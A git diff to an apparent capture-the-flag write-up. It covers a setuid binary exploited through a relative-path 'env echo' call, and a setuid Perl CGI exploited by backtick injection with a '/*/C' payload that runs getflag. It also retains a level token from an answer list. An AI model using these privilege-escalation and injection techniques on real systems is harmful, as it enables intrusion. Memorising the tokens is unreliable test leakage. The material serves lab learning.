@@ -1,4 +1,4 @@
-# All tokens
+# Tokens
 
 ```b
 level01  x24ti5gi3x0ol2eh4esiuxias
@@ -279,42 +279,25 @@ Login
 
 Inspect
 - ❌ `file` `readelf` `strings` 
-- ✅ `ltrace` 
+- also try `id, namei`
 
 ```
 > ls -l
 -rwsr-sr-x 1 flag03 level03 8627 level03
- ^^^       owner flag03 can rwx also setuid bit is set
-    ^^^    group level03 can rx plus setgid bit (s) is set
-       ^^^ others can rx
+ ^^^
+    ^^^ SUID and SGID are set for exec, ie. whichever user/group run the
+        bin, it exec w/ temporary privileges of the owner of the file
 
 👉 when ./level03 is run
-  the entire process runs with owner flag03's priviledges
-  ie. I, user level00, can exploit priviledges limited to flag03
-
-👉 conclusion: execute the ./level03 and doing so we gain
-  temporary elevated permissions as flag03
+  the entire process runs with owner flag03's priviledges, 
+  ie. we gain temporary permissions as flag03
 ```
 
-- We may also try `id` & `namei`
-
-```b
-> id
-uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
-
-> namei -l ./level03 
-dr-x------ level03 level03 .
--rwsr-sr-x flag03  level03 level03
-
-> namei -l /bin/getflag
--rwxr-xr-x root root getflag
-```
-
-- `ltrace` traces library function calls when the binary is executed
+✅ Use `ltrace` 
+- tracing library function calls when the binary is executed
 
 ```b
 > ltrace ./level03
-  👉 we can see the `s` bit in action
 
 ### output
 getegid()                                           = 2003
@@ -324,12 +307,8 @@ setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
 system("/usr/bin/env echo Exploit me" ...
 
 ### observations
-👉 getegid & geteuid return a effective group/user ID 2003 
-  which is my `id` as `level03`.
-👉 Because privileges are elevated during the process
-  we have temporary permissions as `flag03`.
-👉 This way we can exploit the `/usr/bin/env echo`
-  relative path vulnerability.
+👉 sets the real u/g id, the effective u|g id and
+the saved set-user|group-ID of the calling process
 ```
 
 - Solution
@@ -1054,8 +1033,7 @@ Login
 ```
 
 Tryout
-- We have a Perl script
-- Again, possible `backtick injection` targeting the query string
+- We have a Perl script 👉 possible `backtick injection` in query string
 
 ```b
 > ls -l level12.pl 
@@ -1071,11 +1049,10 @@ print "Content-type: text/html\n\n";
 sub t {
   $nn = $_[1];
   $xx = $_[0];         🟡 receives query string, the 1st part thereof
-  $xx =~ tr/a-z/A-Z/;  🟡 tr all lowercase alpha to caps
-  $xx =~ s/\s.*//;     🟡 sub all wsp to // ie. is nothing 
+  $xx =~ tr/a-z/A-Z/;  🟡 `tr` all lowercase alpha to caps
+  $xx =~ s/\s.*//;     🟡 `sub` all whitespaces w/ nothing 
 
-  🔵 Vulnerability -Backtick Injection:
-  exploits enclosed shell command execution 
+  🔵 Vulnerability - Backtick Injection
 
   @output = `egrep "^$xx" /tmp/xd 2>&1`;
   foreach $line (@output) {
@@ -1099,11 +1076,12 @@ n(t(param("x"), param("y")));
 ```
 
 Solution
-- Backtick command injection ``` `/*/C` ```
-  - gets executed by PERL right away
-- But why still fakinig an ___allcaps___ filename:
-  - bc. program runs fast, and `tr` and pattern matching `=~` operate at almost simultaneously
-  - to avoid asynchronous execution btw steps, we sort of ___continue/delay___ the script a little 
+- Create a file: ``` `/*/C` ``` which contains a getflag command
+- The setuid `.pl` script executes a backticks-enclosed expression 
+- Why still fake an ALLCAPS filename?
+  - bc. the program runs fast
+  - `tr` and `=~` pattern matching run at almost simultaneously
+  - to avoid asynchronicit , we ___delay___ the script a little 
 
 ```b
 > echo "getflag > /tmp/tmp" > /tmp/C 
